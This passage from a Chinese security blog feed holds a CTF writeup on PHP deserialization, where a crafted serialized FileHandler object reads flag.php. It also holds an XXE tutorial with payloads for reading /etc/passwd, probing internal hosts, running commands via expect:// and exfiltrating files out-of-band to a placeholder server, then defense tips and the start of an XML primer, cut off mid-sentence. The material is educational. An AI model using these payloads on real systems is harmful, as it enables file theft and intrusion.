string double-quoted-string">"/tmp/tmpfile"</span><span class="token punctuation">;</span>        <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"Hello World!"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">==</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Bad Hacker!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">write</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Too long!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Successful!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">else</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">output</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$res</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">return</span> <span class="token variable">$res</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">function</span> <span class="token function-definition function">output</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"[Result]: &lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token variable">$s</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">===</span> <span class="token string double-quoted-string">"2"</span><span class="token punctuation">)</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">op</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"1"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">content</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token function">process</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">32</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">&#123;</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token variable">$str</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">string</span><span class="token punctuation">)</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'str'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_valid</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>writeup：</strong></p><p><strong>分析:</strong></p><ol><li>根据题目及源码中unserialize()判断此题考查反序列化</li></ol><p>  <img src="https://img-blog.csdnimg.cn/20210429224110400.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ol start="2"><li><p>flag存储在flag.php中</p><p><img src="https://img-blog.csdnimg.cn/20210429224125343.jpg" alt="在这里插入图片描述"></p></li></ol><ol start="3"><li><p>题目中有两个魔术方法： <strong>construct()、destruct()</strong></p><p> <img src="https://img-blog.csdnimg.cn/20210429224136782.jpg" alt="在这里插入图片描述"></p></li></ol><p>  <img src="https://img-blog.csdnimg.cn/20210429224149702.jpg" alt="在这里插入图片描述"></p><ol start="4"><li>destruct()中会调用process,且op=1写入,op=2读取</li></ol><p>  <img src="https://img-blog.csdnimg.cn/20210429224243312.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>  <img src="https://img-blog.csdnimg.cn/20210429224323475.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ol start="5"><li>涉及对象FileHandler,变量op及filename,content,进行构造输出.</li></ol><pre class="line-numbers language-none"><code class="language-none">&lt;?phpclass FileHandler &#123;    public $op&#x3D;&#39; 2&#39;;    public $filename&#x3D;&#39;flag.php&#39;;    public $content&#x3D;&#39;jaa&#39;;                 &#x2F;&#x2F;变量content不涉及题目可随意填写&#125;$flag &#x3D; new FileHandler();$flag_1 &#x3D; serialize($flag);echo $flag_1;    ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>涉及:反序列化魔术方法调用，弱类型绕过,ascii绕过</strong></p><ol><li><p><code>使用该类对flag进行读取,这里面能利用的只有__destruct函数(析构函数)。__destruct函数对this-&gt;op进行了===判断并内容在2字符串时会赋值为1.</code></p><p><code>procesa函数中使用==对$this-&gt;op进行判断(为2的情况下才能读取内容),因此这里存在弱类型比较,可以使用数字2或``字符串&#39; 2&#39;绕过判断。</code></p></li></ol><p><img src="https://img-blog.csdnimg.cn/20210429224343769.jpg" alt="在这里插入图片描述"></p><p><img src="https://img-blog.csdnimg.cn/20210429224403987.jpg" alt="在这里插入图片描述"></p><ol start="2"><li><code>is_valid函数还对序列化字符串进行了校验，因为成员被protected修饰,因此序列化字符串中会出现ascii为0的字符。经过测试,在PHP7.2+的环境中,使用publie修饰成员并序列化,反序列化后成员也会被public覆盖修饰。</code></li></ol><p><strong>实操:</strong></p><p>上述步骤5构造输出:</p><p><img src="https://img-blog.csdnimg.cn/20210429224418905.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>得到序列化后的字符串</p><p><code>O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:2:&quot; 2&quot;;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:3:&quot;jaa&quot;;&#125;</code></p><p>将该字符串传递给参数str并在url中以GET方式进行传参</p><p><code>https://IP/?str=O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:2:&quot; 2&quot;;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;s:3:&quot;jaa&quot;;&#125;</code></p><p>之后查看源代码得到flag.</p><p><img src="https://img-blog.csdnimg.cn/20210429224441269.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0phYXNlbnlp,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
      
      
      
        <tags>
            
            <tag> web安全基础 </tag>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE漏洞介绍</title>
      <link href="/2022/01/15/xxe-lou-dong/"/>
      <url>/2022/01/15/xxe-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h1><p><strong>前置知识：</strong>    </p><p>​    XML被设计为传输和存储数据。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。其焦点是数据的内容。 详情–&gt;<a href="">XML基础介绍</a></p><h2 id="XXE漏洞简介"><a href="#XXE漏洞简介" class="headerlink" title="XXE漏洞简介"></a>XXE漏洞简介</h2><p>​    <strong>XXE</strong>（XML External Entity Injection）即<strong>XML</strong>外部实体注入漏洞。XXE漏洞发生在应用程序解析XML输入时，<strong>没有禁止外部实体的加载</strong>，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。</p><h2 id="XXE漏洞触发点"><a href="#XXE漏洞触发点" class="headerlink" title="XXE漏洞触发点"></a>XXE漏洞触发点</h2><p>可以上传XML文件的位置且未对XML文件进行过滤</p><h2 id="XXE漏洞检测"><a href="#XXE漏洞检测" class="headerlink" title="XXE漏洞检测"></a>XXE漏洞检测</h2><ul><li>Content-Type值判断</li></ul><p>​    可以使用BurpSuite抓取数据包查看。若<code>Content-type=text/xml</code>或<code>Content-type=application/xml</code>；表示接收数据为xml格式，可进行漏洞检测。</p><ul><li><p>更改Content-Type为xml类型进行尝试</p></li><li><p>数据格式类型判断</p></li></ul><p>​    类似于<code>&lt;user&gt;test&lt;/user&gt;&lt;pass&gt;Mikasa&lt;/pass&gt;</code>典型xml格式</p><h2 id="XXE漏洞利用"><a href="#XXE漏洞利用" class="headerlink" title="XXE漏洞利用"></a>XXE漏洞利用</h2><p><strong>补充：支持的协议</strong></p><table><thead><tr><th>Libxml2</th><th>PHP</th><th>Java</th><th>.NET</th></tr></thead><tbody><tr><td>file</td><td>file</td><td>file</td><td>file</td></tr><tr><td>http</td><td>http</td><td>http</td><td>http</td></tr><tr><td>ftp</td><td>ftp</td><td>ftp</td><td>ftp</td></tr><tr><td></td><td>php</td><td>https</td><td>https</td></tr><tr><td></td><td>comepress.zlib</td><td>jar</td><td></td></tr><tr><td></td><td>comepress.bzip2</td><td>netdoc</td><td></td></tr><tr><td></td><td>data</td><td>mailto</td><td></td></tr><tr><td></td><td>glob</td><td>gopher *</td><td></td></tr><tr><td></td><td>phar</td><td></td><td></td></tr></tbody></table><h3 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h3><p><strong>协议</strong></p><ul><li>读文件-通过DTD外部实体声明</li></ul><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE a[    &lt;!ENTITY b SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;]&gt;&lt;a&gt;&amp;b;&lt;&#x2F;a&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>内网探针-将xxe转换为ssrf</p><p>我们利用这种方法可进行内网探测：某个内网ip是否存在、对应路径文件是否存在、端口扫描等等。根据返回类型(无回显可尝试根据响应时间长度判断)的不同来判断我们想要的结果。例如：请求正确时界面无变化、请求错误时进行报错。如下测试内网是否存在ip:192.168.0.103、该ip是否开启80端口、是否存在index.txt文件。</p></li></ul><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE a[    &lt;!ENTITY b SYSTEM &quot;http:&#x2F;&#x2F;192.168.0.103:80&#x2F;index.txt&#x2F;&quot;&gt;]&gt;&lt;a&gt;&amp;b;&lt;&#x2F;a&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>RCE（此类型在实战中并不常见，须在安装expect扩展的PHP环境里执行命令）</li></ul><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE a[    &lt;!ENTITY b SYSTEM &quot;expect:&#x2F;&#x2F;id&quot;&gt;            &lt;!--id为执行的系统命令--&gt;]&gt;&lt;a&gt;&amp;b;&lt;&#x2F;a&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>外部应用</strong></p><ul><li>引入外部实体</li></ul><p>在自己的服务器下放一个evil.dtd文件，通过DTD外部实体声明引入DTD文档<code>http://example.com/evil.dtd</code>，再通过解析evil.dtd文件引入外部实体声明。</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE a [       &lt;!ENTITY b SYSTEM &quot;http:&#x2F;&#x2F;example.com&#x2F;evil.dtd&quot;&gt;]&gt;&lt;a&gt;&amp;b;&lt;&#x2F;a&gt; &lt;!--http:&#x2F;&#x2F;example.com&#x2F;evil.dtd内容为--&gt;&lt;!ENTITY b SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="无回显（Blind-XXE）"><a href="#无回显（Blind-XXE）" class="headerlink" title="无回显（Blind XXE）"></a>无回显（Blind XXE）</h3><p><strong>OOB(Out-Of-Band)：</strong>使用Blind XXE 漏洞来构建一条外带数据OOB（Out-Of-Band）通道来读取数据。</p><p>​    原理：带着获取的文件源码以 get 参数或其他形式去访问我们的服务器，然后在日志里就可以找到我们要获取的内容了-反向链接配合。</p><p><strong>实例</strong>：<code> xxx.dtd</code>文件内容：<br><code>&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#39;http://xxx/x.php?hs=%hs;&#39;&gt;&quot;&gt;  </code></p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [    &lt;!ENTITY % hs SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;C:&#x2F;1.txt&quot;&gt; &lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;xxx&#x2F;xxx.dtd&quot;&gt;&lt;!--在自己的服务器创建xxx.dtd文件--&gt;%remote;&lt;!--把外部文件（xxx.dtd）引入XML中--&gt;%all;&lt;!--替换为后边的嵌套实体--&gt;]&gt;&lt;root&gt;&amp;send;&lt;&#x2F;root&gt;&lt;!--在自己的服务器访问读取的内容--!&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>为了读取数据的准确性这里可以用<strong>base64</strong>进行将读取内容进行编码。如下：</p><pre class="line-numbers language-xml-dtd" data-language="xml-dtd"><code class="language-xml-dtd">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;&lt;!DOCTYPE ANY [    &lt;!ENTITY % hs SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;C:&#x2F;1.txt&quot;&gt; &lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;xxx&#x2F;xxx.dtd&quot;&gt;&lt;!--在自己的服务器创建xxx.dtd文件--&gt;%remote;&lt;!--把外部文件（xxx.dtd）引入XML中--&gt;%all;&lt;!--替换为后边的嵌套实体--&gt;]&gt;&lt;root&gt;&amp;send;&lt;&#x2F;root&gt;&lt;!--在自己的服务器访问读取的内容--!&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="XXE漏洞防御"><a href="#XXE漏洞防御" class="headerlink" title="XXE漏洞防御"></a>XXE漏洞防御</h2><ul><li>禁用外部实体</li></ul><p>禁用外部实体方法：</p><pre class="line-numbers language-none"><code class="language-none">PHP：libxml_disable_entity_loader(true); JAVA:DocumentBuilderFactory dbf &#x3D;DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false); Python：from lxml import etreexmlData &#x3D; etree.parse(xmlSource,etree.XMLParser(resolve_entities&#x3D;False))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>过滤用户提交xml数据</p><p>关键词<code>&lt;!DOCTYPE</code>、<code>&lt;!ENTITY</code>、<code>SYSTEM</code>、<code>PUBLIC</code></p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> web安全基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XML基础介绍</title>
      <link href="/2022/01/15/xml-ji-chu/"/>
      <url>/2022/01/15/xml-ji-chu/</url>
      
        <content type="html"><![CDATA[<h1 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h1><h2 id="XML简介"><a href="#XML简介" class="headerlink" title="XML简介"></a>XML简介</h2><p>​    XML（EXtensible Markup Language）可扩展标记语言。XML是一种标记语言，很类似HTML，但并非HTML的替代，XML设计的宗旨是<strong>传输数据</strong>而非<strong>显示数据</strong>。</p><ul><li>XML被设计为传输和存储数据，其焦点是<strong>数据的内容</strong>。</li><li>HTML被设计用来显示数据，其焦点是*<em>数据的外观</em>。</li></ul><h2 id="XML文档构建模块"><a href="#XML文档构建模块" class="headerlink" title="XML文档构建模块"></a>XML文档构建模块</h2><h3 id="一个-XML-文档实例-元素"><a href="#一个-XML-文档实例-元素" class="headerlink" title="一个 XML 文档实例-元素"></a>一个 XML 文档实例-元素</h3><p>XML 文档必须有一个元素是所有其他元素的<strong>父元素</strong>。该元素称为<strong>根元素</strong>。</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token comment">&lt;!--XML声明,定义 XML 的版本 (1.0) 和所使用的编码 UTF-8--></span><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token comment">&lt;!--根元素--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>note</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!--4个子元素--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>to</span><span class="token punctuation">></span></span>George<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>to</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>from</span><span class="token punctuation">></span></span>John<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>from</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>heading</span><span class="token punctuation">></span></span>Reminder<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>heading</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>Don't forget the meeting!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--根元素结尾--></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>note</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="一个-XML-文档实例-属性"><a href="#一个-XML-文档实例-属性" class="headerlink" title="一个 XML 文档实例-属性"></a>一个 XML 文档实例-属性</h3><p>​    XML 元素可以在开始标签中包含属性，且属性值必须被引号包围，单引号和双引号均可使用。</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>person</span> <span class="token attr-name">sex</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>female<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token comment">&lt;!--sex是一个属性--></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>firstname</span><span class="token punctuation">></span></span>Anna<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>firstname</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>lastname</span><span class="token punctuation">></span></span>Smith<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>lastname</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>person</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>person</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>sex</span><span class="token punctuation">></span></span>female<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>sex</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--sex是一个子元素--></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>firstname</span><span class="token punctuation">></span></span>Anna<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>firstname</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>lastname</span><span class="token punctuation">></span></span>Smith<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>lastname</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>person</span><span class="token punctuation">></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h3><p>​    实体是用来定义普通文本的变量。实体引用是对实体的引用。所有实体均以<code>&amp;</code>开始，以<code>;</code>结束。当文档被XML解析器解析时，实体就会被展开。下面实体在XML中被预定义。</p><table><thead><tr><th>实体引用</th><th>字符</th></tr></thead><tbody><tr><td><code>&amp;lt;</code></td><td>&lt;</td></tr><tr><td><code>&amp;gt;</code></td><td>&gt;</td></tr><tr><td><code>&amp;amp;</code></td><td>&amp;</td></tr><tr><td><code>&amp;quot;</code></td><td>“</td></tr><tr><td><code>apos;</code></td><td>‘</td></tr></tbody></table><h3 id="PCDATA"><a href="#PCDATA" class="headerlink" title="PCDATA"></a>PCDATA</h3><p>​    PCDATA的意思是<strong>被解析</strong>的<strong>字符数据</strong>。可想象为开始标签与结束标签之间的文本，是会被解析器解析的文本，这些文本将被解析器<strong>检查实体</strong>以及<strong>标记</strong>。文本中的标签会被当作标记来处理，而实体会被展开。</p><p>​    被解析的字符数据不应当包含任何 &amp;、&lt; 或者 &gt; 字符；需要使用 <code>&amp;amp;</code>、<code>&amp;lt; </code>以及<code> &amp;gt;</code> 实体来分别替换它们。</p><h3 id="CDATA"><a href="#CDATA" class="headerlink" title="CDATA"></a>CDATA</h3><p>​    CDATA 的意思是字符数据（character data）。</p><p>​    CDATA 是<strong>不会被解析器解析</strong>的文本。在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开</p><h2 id="DTD简介"><a href="#DTD简介" class="headerlink" title="DTD简介"></a>DTD简介</h2><p>​    文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。</p><p>DTD 